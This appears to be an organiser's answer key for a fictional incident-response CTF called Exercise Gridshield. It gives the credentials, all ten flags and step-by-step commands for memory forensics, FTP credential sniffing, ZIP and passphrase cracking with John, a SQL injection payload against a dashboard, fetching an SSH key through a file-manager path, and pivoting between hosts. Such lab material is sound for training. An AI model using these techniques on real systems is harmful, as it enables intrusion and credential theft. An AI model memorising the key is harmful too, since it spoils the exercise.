# Organiser Investigation Guide

This is the public-safe organiser walkthrough. It contains spoilers, flags,
credentials, commands, and expected reasoning for the single local Docker setup.

## Scenario

Exercise Gridshield is a fictional incident-response CTF. A GridVault Bank file
server, `cbfs01`, was contained after ransomware activity. First responders left
an evidence package on the host. The challenger follows the evidence through a
straight chain:

```text
M1 compromised endpoint -> M2 C2 repository -> M3 relay -> M4 workstation
```

The public release does not use an event VPN. Participants connect through
localhost ports exposed by Docker Compose.

## Hosts And Ports

```text
M1 cbfs01 SSH:       127.0.0.1:2221
M2 web:              127.0.0.1:8080
M2 cPanel web:       127.0.0.1:2083
M2 FTP control:      127.0.0.1:2121
M3 relay SSH:        127.0.0.1:2223
M4 workstation SSH:  127.0.0.1:2224
```

Inside Docker, the story still uses public-sim evidence addresses:

```text
M2 C2:     198.51.100.20
M3 relay:  192.0.2.10
M4 host:   198.18.45.23
```

## Credentials

```text
M1 SSH:        investigator / Inv3st!gate2024
Archive key:   4a7f3c91b2d0e865
FTP:           sitebackup / Str0ng#Bkp2024
M2 web:        nsadmin / N0v@S3c!2024
M3 SSH:        infraadmin with vpn_access.pem, passphrase GridVPN#2026
M4 SSH:        devuser with dev_key, passphrase Infradev#99
Wallet:        bc1q7xkm3p9nfv2c8wq4rjh5e6dtya0ls3gkpz8mn
Wallet MD5:    be9fd70d890bce5e7921b86636d02725
```

Compute the wallet MD5:

```bash
printf %s 'bc1q7xkm3p9nfv2c8wq4rjh5e6dtya0ls3gkpz8mn' | md5sum
```

## Flags

Each flag is worth 100 points, for 1000 total.

```text
CTF{SCRIPT_RECOVERED_RUNTIME_CREDS_NOT_HARDCODED}
CTF{VICTIM_ARCHIVE_DECRYPTED_EP009}
CTF{PERSISTENCE_SYSTEMD_WUPDATE_SERVICE}
CTF{ZIP_UNLOCKED_CPANEL_HIDDEN_SECURE_MGMT}
CTF{DIRB_FOUND_SECURE_MGMT_AND_DB_ADMIN}
CTF{SQLI_AGENT_ACTIVITY_DUMP_EP009}
CTF{VPN_DROPOUT_REAL_IP_198_18_45_23_EXPOSED}
CTF{OVPN_CONFIG_DEVUSER_DEV_KEY_INFRADEV99}
CTF{CASE_CLOSED_OPERATOR_ID_RECOVERED}
CTF{CASE_CLOSED_CONTRACT_RECOVERED_MD5_WALLET}
```

## Stage 1 - M1 Memory And Archive

Connect to M1:

```bash
ssh investigator@127.0.0.1 -p 2221
ls -lh /evidence
cat /evidence/case_notes.txt
```

The case note should mention preserved RAM, `archive.enc`, regular outbound
information transfer, and the fact that the activity resumed after restart. It
must not name the malware, FTP password, or C2 credentials.

Copy evidence locally:

```bash
scp -P 2221 investigator@127.0.0.1:/evidence/endpoint.vmem .
scp -P 2221 investigator@127.0.0.1:/evidence/archive.enc .
scp -P 2221 -r investigator@127.0.0.1:/evidence/volatility .
```

Preferred memory path:

```bash
vol -f endpoint.vmem --symbol-dirs ./volatility linux.pslist
vol -f endpoint.vmem --symbol-dirs ./volatility linux.pstree
```

Fallback path:

```bash
strings -a -n 8 endpoint.vmem > endpoint_strings.txt
grep -E 'wupdate|ep-009|ftp.gridvault-records|sitebackup|ARCHIVE_KEY|aes-256-cbc|pbkdf2|INTERVAL=20' endpoint_strings.txt
```

Expected recovered facts:

```text
Process/script: wupdate
Agent ID: ep-009
Host: cbfs01
C2/FTP host: ftp.gridvault-records.test
FTP user: sitebackup
Archive key: 4a7f3c91b2d0e865
Cipher/KDF: aes-256-cbc with pbkdf2
Interval: 20 seconds
Flag: CTF{SCRIPT_RECOVERED_RUNTIME_CREDS_NOT_HARDCODED}
```

Decrypt the archive:

```bash
openssl enc -aes-256-cbc -d -pbkdf2 \
  -k '4a7f3c91b2d0e865' \
  -in archive.enc \
  -out archive.tar.gz
mkdir archive
tar -xzf archive.tar.gz -C archive
grep -R 'CTF{' archive
```

Expected flag:

```text
CTF{VICTIM_ARCHIVE_DECRYPTED_EP009}
```

Persistence check on M1:

```bash
ssh investigator@127.0.0.1 -p 2221
cat /etc/systemd/system/wupdate.service
```

Expected flag:

```text
CTF{PERSISTENCE_SYSTEMD_WUPDATE_SERVICE}
```

Concept: memory analysis reveals the malware direction before packet capture.
The archive confirms victim reference `EP009` and the dataset marker, making the
live traffic step evidence-led rather than guessed.

## Stage 2 - Live FTP Capture And M2

From M1, resolve and capture the FTP control channel:

```bash
getent hosts ftp.gridvault-records.test
timeout 60 sudo tcpdump -i any -nn -s0 -A 'host 198.51.100.20 and port 21'
```

Expected control-channel lines:

```text
USER sitebackup
PASS Str0ng#Bkp2024
STOR /incoming/ep-009.txt
```

Concept: FTP sends username and password in clear text on the control channel.
The malware does not keep the password in memory, but it must transmit it to
authenticate.

Access M2 FTP from M1 or from the host-mapped port:

```bash
ftp 198.51.100.20
```

or:

```bash
ftp 127.0.0.1 2121
```

Download:

```text
encrypted_ops.zip
ops_candidates.txt
c2_instructions.asc
README_RESTORE.txt
```

Crack the ZIP:

```bash
zip2john encrypted_ops.zip > encrypted_ops.hash
john --wordlist=ops_candidates.txt encrypted_ops.hash
john --show encrypted_ops.hash
unzip -P 'N0v@S3c!2024' encrypted_ops.zip -d ops
grep -R 'CTF{' ops
```

Expected flag:

```text
CTF{ZIP_UNLOCKED_CPANEL_HIDDEN_SECURE_MGMT}
```

The ZIP reveals:

```text
nsadmin / N0v@S3c!2024
http://198.51.100.20:2083/login.php
/secure_mgmt/
/db_admin/
/filemanager.php
```

For the public localhost setup, use:

```bash
curl -c m2.cookies -b m2.cookies \
  -d 'username=nsadmin&password=N0v@S3c!2024' \
  http://127.0.0.1:2083/login.php
curl -b m2.cookies http://127.0.0.1:2083/secure_mgmt/
```

Expected flag on the secure management landing page:

```text
CTF{DIRB_FOUND_SECURE_MGMT_AND_DB_ADMIN}
```

## Stage 3 - M2 SQL Injection And Relay Key

Use the dashboard search like a normal user first:

```bash
curl -b m2.cookies 'http://127.0.0.1:2083/secure_mgmt/dashboard.php?search=ep-009'
```

Then test a quote:

```bash
curl -b m2.cookies 'http://127.0.0.1:2083/secure_mgmt/dashboard.php?search=ep-009%27'
```

The SQL error shows that the search is vulnerable. Dump rows:

```bash
curl -b m2.cookies \
  'http://127.0.0.1:2083/secure_mgmt/dashboard.php?search=ep-009%27%20OR%20%271%27%3D%271%27--%20-'
```

Expected flag:

```text
CTF{SQLI_AGENT_ACTIVITY_DUMP_EP009}
```

Expected next lead:

```text
M3 simulated public: 192.0.2.10
SSH user: infraadmin
Key path: /internal/secure_mgmt/keys/vpn_access.pem
Key passphrase: GridVPN#2026
```

Download and validate the key:

```bash
curl -b m2.cookies \
  'http://127.0.0.1:2083/filemanager.php?path=/internal/secure_mgmt/keys/vpn_access.pem' \
  -o vpn_access.pem
chmod 600 vpn_access.pem
ssh-keygen -y -P 'GridVPN#2026' -f vpn_access.pem
```

Connect to M3 in the public setup:

```bash
ssh -i vpn_access.pem -p 2223 infraadmin@127.0.0.1
```

## Stage 4 - M3 Relay Evidence

Natural files to review:

```text
/home/infraadmin/README_RELAY_SUPPORT.md
/var/log/openvpn.log
/var/log/auth.log
/etc/openvpn/config.hash
/etc/openvpn/passphrase_candidates.txt
/etc/openvpn/clients/operator.ovpn.enc
/home/infraadmin/.ssh/dev_key
```

Find the exposed workstation address:

```bash
grep -R '198.18.45.23\\|CTF{' /var/log/openvpn.log /var/log/auth.log
```

Expected flag:

```text
CTF{VPN_DROPOUT_REAL_IP_198_18_45_23_EXPOSED}
```

Crack the operator profile passphrase:

```bash
john --wordlist=/etc/openvpn/passphrase_candidates.txt /etc/openvpn/config.hash
john --show /etc/openvpn/config.hash
```

Expected passphrase:

```text
Infradev#99
```

Decrypt the operator profile:

```bash
openssl enc -aes-256-cbc -d -pbkdf2 \
  -k 'Infradev#99' \
  -in /etc/openvpn/clients/operator.ovpn.enc \
  -out operator.ovpn
grep -R 'CTF{' operator.ovpn
```

Expected flag:

```text
CTF{OVPN_CONFIG_DEVUSER_DEV_KEY_INFRADEV99}
```

The decrypted profile points to `devuser`, the `dev_key`, and the workstation
address `198.18.45.23`.

Copy the key and connect to M4:

```bash
scp -P 2223 -i vpn_access.pem infraadmin@127.0.0.1:/home/infraadmin/.ssh/dev_key .
chmod 600 dev_key
ssh -i dev_key -p 2224 devuser@127.0.0.1
```

## Stage 5 - M4 Workstation Recovery

Review the workstation notes:

```bash
ls -la ~/Desktop ~/Backups
cat ~/Desktop/payment_wallet.txt
cat ~/Desktop/recovery_notes.txt
cat ~/Desktop/ops_notes.txt
```

The recovery note is an attacker self-reminder:

```text
ID scan wrapper: use the wallet string exactly as the PDF password.
Contract mail export: use md5(wallet) as the PDF password.
```

Recover deleted files from the backup image:

```bash
find /home/devuser -type f -size +10M
mkdir -p ~/recovered
photorec /log /d ~/recovered /cmd ~/Backups/workstation_home_backup_2026-05-16.img search
```

The recovered PDFs are fictional and may have generic recovery names. Test them
with `qpdf` rather than relying on filename assumptions.

Decrypt the operator identity PDF:

```bash
qpdf --password='bc1q7xkm3p9nfv2c8wq4rjh5e6dtya0ls3gkpz8mn' --decrypt recovered.pdf id.pdf
strings id.pdf | grep 'CTF{'
```

Expected flag:

```text
CTF{CASE_CLOSED_OPERATOR_ID_RECOVERED}
```

Decrypt the service contract PDF with `md5(wallet)`:

```bash
wallet='bc1q7xkm3p9nfv2c8wq4rjh5e6dtya0ls3gkpz8mn'
wallet_md5="$(printf %s "$wallet" | md5sum | awk '{print $1}')"
qpdf --password="$wallet_md5" --decrypt recovered_contract.pdf contract.pdf
strings contract.pdf | grep 'CTF{'
```

Expected flag:

```text
CTF{CASE_CLOSED_CONTRACT_RECOVERED_MD5_WALLET}
```

## Coaching Notes

- If M1 SSH fails, confirm `docker ps`, `docker logs gridshield_m1`, and
  `nc -vz 127.0.0.1 2221`.
- If Volatility symbols fail, use the `strings` fallback and explain that the
  memory image still contains the runtime script/config.
- If FTP capture is empty, capture from inside M1 and wait longer than one
  20-second interval.
- If passive FTP on `127.0.0.1:2121` is awkward, use FTP from M1 to
  `198.51.100.20`, which is the intended in-lab C2 address.
- If an SSH key fails with a libcrypto-style error, redownload it, check that no
  web page or flag text was appended, and run `ssh-keygen -y` before SSH.
- If final PDF names are unclear after carving, try the known wallet password
  and the computed wallet MD5 on each recovered PDF.
